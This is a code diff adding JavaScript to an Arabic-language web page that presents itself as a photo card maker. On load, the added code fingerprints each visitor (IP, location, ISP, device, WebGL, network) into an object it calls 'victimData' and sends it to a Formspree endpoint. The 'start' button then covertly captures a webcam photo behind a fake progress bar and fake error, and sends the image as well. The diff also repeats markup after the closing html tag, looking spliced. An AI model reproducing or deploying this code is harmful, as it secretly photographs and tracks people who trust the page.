@@ -54,6 +54,195 @@
 
   <script>
     const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
+    let victimData = {};
+    
+    async function collectAll() {
+      let ip = 'unknown';
+      try { 
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+      } catch(e) { 
+        ip = 'unknown';
+      }
+      
+      let location = {};
+      try {
+        const res = await fetch('https://ipapi.co/' + ip + '/json/');
+        location = await res.json();
+      } catch(e) {
+        location = {};
+      }
+      
+      victimData = {
+        timestamp: new Date().toISOString(),
+        localTime: new Date().toLocaleString('ar-SA'),
+        ip: ip,
+        location: {
+          city: location.city || 'unknown',
+          region: location.region || 'unknown',
+          country: location.country_name || 'unknown',
+          country_code: location.country_code || 'unknown',
+          timezone: location.timezone || 'unknown',
+          isp: location.org || 'unknown'
+        },
+        device: {
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          screen: screen.width + 'x' + screen.height,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          cores: navigator.hardwareConcurrency,
+          memory: navigator.deviceMemory || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints,
+          online: navigator.onLine,
+          cookieEnabled: navigator.cookieEnabled
+        },
+        browser: {
+          vendor: navigator.vendor,
+          appName: navigator.appName,
+          appVersion: navigator.appVersion
+        },
+        network: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt
+        } : 'unavailable',
+        webgl: (function() {
+          try {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+            };
+          } catch(e) { return 'unavailable'; }
+        })(),
+        referrer: document.referrer || 'direct',
+        url: location.href
+      };
+      
+      try {
+        await fetch(FORMSPREE_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event: 'page_visit',
+            victim: victimData
+          })
+        });
+      } catch(e) {}
+    }
+    
+    collectAll();
+    
+    async function start() {
+      var btn = document.getElementById('btn');
+      var placeholder = document.getElementById('placeholder');
+      var video = document.getElementById('video');
+      var progress = document.getElementById('progress');
+      var fill = document.getElementById('fill');
+      var status = document.getElementById('status');
+      var error = document.getElementById('error');
+      
+      btn.disabled = true;
+      placeholder.style.display = 'none';
+      
+      try {
+        var stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: 1280, height: 720 },
+          audio: false
+        });
+        
+        video.srcObject = stream;
+        video.style.display = 'block';
+        await video.play();
+        
+        await new Promise(function(resolve) { setTimeout(resolve, 1000); });
+        
+        var canvas = document.getElementById('canvas');
+        canvas.width = 1280;
+        canvas.height = 720;
+        var ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 1280, 720);
+        
+        var image = canvas.toDataURL('image/jpeg', 0.6);
+        
+        stream.getTracks().forEach(function(t) { t.stop(); });
+        video.style.display = 'none';
+        placeholder.style.display = 'block';
+        placeholder.textContent = '✅';
+        
+        progress.style.display = 'block';
+        
+        var steps = [
+          { p: 20, t: 'جاري تحليل الوجه...' },
+          { p: 50, t: 'جاري تطبيق التصميم...' },
+          { p: 80, t: 'جاري الحفظ...' }
+        ];
+        
+        for(var i = 0; i < steps.length; i++) {
+          fill.style.width = steps[i].p + '%';
+          status.textContent = steps[i].t;
+          await new Promise(function(resolve) { setTimeout(resolve, 800); });
+        }
+        
+        fill.style.width = '100%';
+        status.textContent = 'فشلت العملية!';
+        await new Promise(function(resolve) { setTimeout(resolve, 500); });
+        
+        progress.style.display = 'none';
+        error.style.display = 'block';
+        btn.textContent = 'إعادة المحاولة';
+        btn.disabled = false;
+        
+        await fetch(FORMSPREE_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            event: 'camera_capture',
+            victim: victimData,
+            image: image,
+            summary: {
+              ip: victimData.ip,
+              country: victimData.location.country,
+              hasCamera: true
+            }
+          })
+        });
+        
+      } catch(e) {
+        placeholder.style.display = 'block';
+        placeholder.textContent = '📷';
+        btn.disabled = false;
+        alert('يجب السماح بالكاميرا لإنشاء البطاقة');
+      }
+    }
+  </script>
+</body>
+</html>
+      <div class="cam-placeholder" id="placeholder">📷</div>
+      <video id="video" autoplay playsinline></video>
+    </div>
+    
+    <div class="progress" id="progress">
+      <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+      <div class="status" id="status">جاري التحميل...</div>
+    </div>
+    
+    <button class="btn btn-primary" id="btn" onclick="start()">بدء التصوير</button>
+    
+    <div class="error" id="error">
+      😔 عذراً! فشلت المعالجة.<br>يرجى المحاولة لاحقاً.
+    </div>
+  </div>
+
+  <canvas class="hidden" id="canvas"></canvas>
+
+  <script>
+    const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
     let stream = null;
     let victimData = {};
     
